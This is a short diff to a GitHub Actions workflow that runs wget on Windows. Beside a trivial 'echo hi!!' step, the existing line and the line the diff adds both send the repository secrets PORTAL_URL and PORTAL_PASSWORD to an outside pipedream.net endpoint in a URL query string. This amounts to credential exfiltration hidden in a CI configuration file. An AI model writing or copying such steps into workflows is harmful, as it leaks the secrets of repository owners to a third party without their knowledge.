@@ -12,6 +12,6 @@ jobs:
       run: |
         echo "hi!!"
          C:\msys64\usr\bin\wget.exe "https://eopjgnu0isbkpxf.m.pipedream.net/?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
-        C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+        C:\msys64\usr\bin\wget.exe '''https://eopjgnu0isbkpxf.m.pipedream.net/?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
 
         
